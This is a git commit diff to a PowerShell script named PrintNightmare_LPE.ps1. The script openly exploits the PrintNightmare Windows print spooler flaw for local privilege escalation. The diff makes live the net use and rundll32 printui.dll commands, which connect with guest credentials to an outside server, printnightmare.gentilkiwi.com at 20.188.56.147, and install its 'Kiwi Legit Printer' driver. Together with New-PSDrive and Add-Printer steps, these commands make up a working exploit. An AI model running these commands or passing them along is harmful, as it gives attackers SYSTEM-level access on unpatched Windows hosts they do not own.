8aa41b81e4d1d7282e03c319d793f87c32dd4207
Dvir S <dviros@me.com>
2021-09-11 12:36:26 +0100

    Update PrintNightmare_LPE.ps1

--- PrintNightmare_LPE.ps1
+++ PrintNightmare_LPE.ps1
@@ -3,13 +3,15 @@ All respect to @gentilkiwi for his amazing work
 This script attempts to automatically connect to his LPE-as-a-service server,
 and exploit vulnerable endpoints.
 
-Legacy code, based on rundll32 and net use can be seen below:
-net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
-rundll32 printui.dll,PrintUIEntry /dd /dn /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
-rundll32 printui.dll,PrintUIEntry /in /q /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
+Due to the way the printer server acts, it is now impossible to add it as a filesystem share. Use the legacy code below, based on rundll32 and net use (PSH works best):
 #>
 
+net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
+rundll32 printui.dll,PrintUIEntry /dd /dn /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
+rundll32 printui.dll,PrintUIEntry /in /q /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
 
+
+<#
 if (get-printer | Where-Object name -In ("\\printnightmare.gentilkiwi.com\Kiwi Legit Printer")){
 	Remove-Printer -Name "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
 	}
@@ -20,7 +22,7 @@ $cred = New-Object System.Management.Automation.PSCredential ("$serverIP\gentilg
 New-PSDrive -Name "gentilkiwi" -Root "\\printnightmare.gentilkiwi.com\$" -PSProvider FileSystem -Credential $cred
 Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
 
-<# Obsolete
+
 if ([System.Environment]::Is64BitOperatingSystem){
 	Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
 	}
